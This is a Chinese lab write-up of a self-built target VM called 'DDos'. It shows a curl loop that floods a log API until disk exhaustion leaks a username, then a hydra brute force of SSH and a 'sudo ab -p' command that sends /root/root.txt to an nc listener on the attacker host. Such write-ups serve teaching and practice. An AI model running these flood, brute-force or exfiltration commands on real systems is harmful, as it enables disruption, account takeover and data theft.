# DDos 靶机复盘：刷爆日志接口到 sudo ab 外带 root flag

> 本文记录的是群主自建的隔离靶机复盘。刷接口打满磁盘、口令爆破与 sudo 提权手法均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | DDos（群主自建靶机） |
| 目标地址 | 192.168.134.77（SSH 在 1/tcp，HTTP 在 5000/tcp；Kali `192.168.134.4`） |
| 关键入口 | `POST /api/create_log` 无上限写文件，刷满磁盘逼出 `RESOURCE_EXHAUSTED` 报错 |
| 最终路径 | 报错泄露用户名 → rockyou 爆破 SSH → `sudo ab -p` 外带 `/root/root.txt` |

![nmap 全端口扫描](/content/ddos-log-flood-sudo-ab/image-01.webp)

## 1. 攻击链概览

这台靶机名字就叫 DDos，攻击思路也确实反常规：**DoS 不是目的，是逼服务在报错里把管理员账号吐出来**。磁盘打满后 `create_log` 开始返回带 `admin_contact` 的错误详情，用户名到手，剩下的就是爆破和一个很冷的 sudo 提权点。

```text
nmap：1/tcp SSH，5000/tcp Werkzeug（JSON 自述文档）
  → ffuf 补出文档未列的 /api/health、/api/quote
  → while true 刷 /api/create_log，每次请求落一个 .log
  → 磁盘打满：RESOURCE_EXHAUSTED 报错泄露 admin_contact
  → hydra + rockyou 爆破 1/tcp SSH → tonglinggejim0:666666
  → user flag
  → sudo -l：(ALL) NOPASSWD: /usr/bin/ab
  → sudo ab -p /root/root.txt → nc 收 POST body → root flag
```

## 2. 侦察：5000 上的自述文档

![首页 JSON 自述文档](/content/ddos-log-flood-sudo-ab/image-02.webp)

nmap 只有两条 TCP：`1/tcp` 是 OpenSSH 10.0p2（Debian），`5000/tcp` 是 Werkzeug/3.1.8（Python 3.13.5），标题一栏直接写着 `Site doesn't have a title (application/json)`——整个站就是个 JSON API。

浏览器打开 5000 端口，首页是一份服务自述：`Log Management System v1.2.5`，附了完整的接口清单：

| 接口 | 方法 | 说明 |
|------|------|------|
| `/` | GET | 这份文档本身 |
| `/api/create_log` | POST | 创建日志，参数 `content`，返回文件名与 `/uploads/` 链接 |
| `/api/server_time` | GET | 服务器时间 |
| `/api/system_info` | GET | 系统信息 |
| `/api/disk_status` | GET | 磁盘使用统计 |

文档里的示例请求值得细看：`-d '{"content": "Error: Database connection failed"}'`——一会儿刷接口用的就是这条原文。

![ffuf 对 /api/ 目录爆破](/content/ddos-log-flood-sudo-ab/image-03.webp)

自述文档不等于全量清单。用 ffuf 对 `/api/` 补一刀：

```bash
ffuf -u http://192.168.134.77:5000/api/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -X GET -o api.txt -of json -t 40 -timeout 10 -mc 200-299,301,302,307,401,403,405,500
```

```text
health   [Status: 200, Size: 96,  Words: 1,  Lines: 2, Duration: 948ms]
quote    [Status: 200, Size: 137, Words: 14, Lines: 2, Duration: 942ms]
```

`health` 和 `quote` 都不在文档里。

![health 与 quote 的响应](/content/ddos-log-flood-sudo-ab/image-04.webp)

`/api/health` 回服务状态，`/api/quote` 回励志名言——而且**每次请求名言都不一样**：

![quote 每次返回不同的名言](/content/ddos-log-flood-sudo-ab/image-05.webp)

从现象看 `quote` 更像烟雾弹：除了证明服务活着，对推进没有任何帮助。真正值钱的线索在 `create_log` 的返回结构里——每次请求都会生成一个哈希命名的 `.log` 文件存进 `/uploads/`，文档里看不到任何容量上限或清理机制。

## 3. DoS：把磁盘刷满，让服务自己交代

题目叫 DDos，入口又是"无限写文件"，思路就很直白了：循环刷 `create_log`，用文档里的示例原文当内容：

```bash
while true ;do curl -X POST http://192.168.134.77:5000/api/create_log \
  -H "Content-Type:application/json" \
  -d '{"content": "Error: Database connection failed"}';done
```

挂一段时间后，响应从 `{"status":"success",...}` 变成了这个：

![RESOURCE_EXHAUSTED 报错泄露 admin_contact](/content/ddos-log-flood-sudo-ab/image-06.webp)

```json
{
  "details": {
    "admin_contact": "tonglinggejim0",
    "hint": "Please contact system administrator immediately."
  },
  "error_code": "RESOURCE_EXHAUSTED",
  "message": "System critical: Unable to allocate storage.",
  "status": "error"
}
```

**磁盘打满本身不加分，报错详情才是这次的真正产出**：`admin_contact` 直接给出了用户名 `tonglinggejim0`。这台题把"DoS"做成了信息收集的手段——服务资源耗尽时进入异常分支，异常分支里的报错比正常响应话多得多。

## 4. SSH 爆破与 user flag

用户名有了，回看 nmap：SSH 在 **1 端口**（不是 22），爆破时要指定。

![hydra 爆破出 SSH 口令](/content/ddos-log-flood-sudo-ab/image-07.webp)

```bash
hydra -l tonglinggejim0 -P /usr/share/wordlists/rockyou.txt ssh://192.168.134.77:1
```

rockyou 里跑出了 `666666`：

```text
[1][ssh] host: 192.168.134.77   login: tonglinggejim0   password: 666666
```

![登录后拿 user flag 与 sudo -l](/content/ddos-log-flood-sudo-ab/image-08.webp)

```bash
ssh -p 1 tonglinggejim0@192.168.134.77
```

家目录里 `user.txt` 是 root 所有但全局可读：

```text
flag{user-faac9dae19d37c8d8876e0a6b05837ba}
```

`sudo -l` 给了这台题最有意思的一个点：

```text
User tonglinggejim0 may run the following commands on DDos:
    (ALL : ALL) NOPASSWD: /usr/bin/ab
```

## 5. sudo ab：不拿 shell 也能读 root 文件

`/usr/bin/ab` 是 ApacheBench，一个 HTTP 压测工具。乍看和提权毫无关系，但它的 `-p` 参数会把**指定文件的内容作为 POST body 发出去**（[GTFOBins: ab](https://gtfobins.github.io/gtfobins/ab/) 的 Upload 手法）。sudo 跑它，就是让 root 读任意文件再发到指定地址。

![sudo ab 外带 root flag 到 nc 监听](/content/ddos-log-flood-sudo-ab/image-09.webp)

Kali 上先起监听，再让 ab 把 `/root/root.txt` 当 POST 数据发过来：

```bash
# Kali
nc -lvnp 4444

# 靶机
sudo /usr/bin/ab -p /root/root.txt http://192.168.134.4:4444/
```

nc 收到的请求体里就是 flag：

```text
POST / HTTP/1.0
Content-length: 44
Content-type: text/plain
Host: 192.168.134.4:4444
User-Agent: ApacheBench/2.3

flag{root-429f809b23ee59b37202d1a909096e43}
```

有个现象值得记录：ab 发完请求会**等一个像样的 HTTP 响应**，`nc -lvnp` 不会回，于是它一直挂着（截图里 `real 8178s`、`cpu 0%`）。不影响结果——数据在握手后就已经打到 nc 里了，看到 flag 直接 Ctrl+C 断开即可。

## 6. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| 自述文档 ≠ 全量清单 | 首页接口文档很详细，但 `health`/`quote` 靠 ffuf 补出；目录爆破仍然不可省 |
| DoS 作为信息收集 | 资源耗尽逼服务走异常分支，`RESOURCE_EXHAUSTED` 的 `details` 里藏着用户名 |
| 报错详情是富矿 | `admin_contact`、`hint` 这类字段是出题人特意留的；看到非标准报错先读完整 JSON |
| sudo 白名单里的冷门工具 | 压测工具 `ab` 也能变任意文件读：`-p` 把文件内容当 POST body 发出，全程不需要 shell |

## 7. 复盘

这台题最大的收获是**思路转换**：看到 DDos 三个字，第一反应是打崩服务拿 shell 或者找 flag，但这里的 DoS 只是杠杆——真正要的是服务在资源耗尽时吐出来的那行报错。以后遇到带 `details`/`error_code` 结构的 API 报错，值得把整个 JSON 读完整再决定下一步，而不是只看 message。

提权环节刷新了我对"sudo 白名单审计"的认知：`sudo -l` 里出现 `ab` 这种压测工具，第一眼很容易当成无害项放过。判断标准不是"这工具是干嘛的"，而是**它能不能读写文件或执行命令**——`-p` 参数让它成了一个 root 身份的文件外带通道。GTFOBins 的 ab 条目就列着这条 Upload 手法，sudo 白名单里每个二进制都值得查一遍。

## 参考

- [GTFOBins：ab](https://gtfobins.github.io/gtfobins/ab/)（Upload → `ab -p <file> http://attacker/`）
- [DDOS靶机出题思路（Bilibili，靶机作者）](https://www.bilibili.com/video/BV1bihD6zEMv)
